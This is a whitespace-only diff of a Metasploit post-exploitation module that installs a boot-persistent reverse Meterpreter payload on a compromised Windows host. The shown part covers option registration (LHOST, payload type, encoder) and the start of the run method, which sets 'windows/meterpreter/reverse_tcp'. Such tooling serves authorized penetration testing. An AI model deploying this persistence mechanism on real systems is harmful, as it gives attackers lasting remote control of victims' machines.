@@ -29,10 +29,10 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 				'Name'          => 'Windows Manage Persistent Payload Installer',
 				'Description'   => %q{
-						This Module will create a boot persistent reverse Meterpreter session by
-						installing on the target host the payload as a script that will be executed
-						at user logon or system startup depending on privilege and selected startup
-						method.
+					This Module will create a boot persistent reverse Meterpreter session by
+					installing on the target host the payload as a script that will be executed
+					at user logon or system startup depending on privilege and selected startup
+					method.
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
@@ -40,6 +40,7 @@ class Metasploit3 < Msf::Post
 				'Platform'      => [ 'windows' ],
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
+
 		register_options(
 			[
 				OptAddress.new('LHOST', [true, 'IP for persistent payload to connect to.']),
@@ -50,10 +51,10 @@ class Metasploit3 < Msf::Post
 				OptString.new('TEMPLATE', [false, 'Alternate template Windows PE File to use.']),
 				OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter Payload Type.', 'TCP',['TCP','HTTP','HTTPS']])
 			], self.class)
+
 		register_advanced_options(
 			[
-				OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",
-						""]),
+				OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",""]),
 				OptString.new('ENCODER', [false, "Encoder name to use for encoding.",]),
 				OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.']),
 
@@ -64,7 +65,7 @@ class Metasploit3 < Msf::Post
 	#-------------------------------------------------------------------------------
 	def run
 		print_status("Running module against #{sysinfo['Computer']}")
-		
+
 		# Set vars
 		lhost = datastore['LHOST']
 		lport = datastore['LPORT']
@@ -75,7 +76,7 @@ class Metasploit3 < Msf::Post
 		@clean_up_rc = ""
 		host,port = session.tunnel_peer.split(':')
 		payload = "windows/meterpreter/reverse_tcp"
-		
+
 		# Check that if a template is provided that it actually exists
 		if datastore['TEMPLATE']
 			if not ::File.exists?(datastore['TEMPLATE'])
@@ -85,7 +86,7 @@ class Metasploit3 < Msf::Post
 				template_pe = datastore['TEMPLATE']
 			end
 		end
-		
+
 		# Set the proper payload
 		case datastore['STARTUP']
 		when /TCP/i
